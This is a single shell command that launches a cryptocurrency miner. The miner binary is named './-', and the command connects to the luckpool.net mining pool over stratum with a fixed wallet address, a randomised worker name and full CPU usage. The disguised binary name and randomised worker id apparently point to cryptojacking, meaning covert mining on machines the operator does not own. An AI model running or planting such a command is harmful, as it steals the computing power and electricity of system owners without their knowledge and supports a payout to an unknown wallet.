./- -c stratum+tcp://eu.luckpool.net:3956#xnsub -u R9MYDigKy1i1a9EGT2fhM4ZdAEjxG9oRfw.$(echo $(shuf -i 1-9 -n 1)-hans) -p x --cpu 100
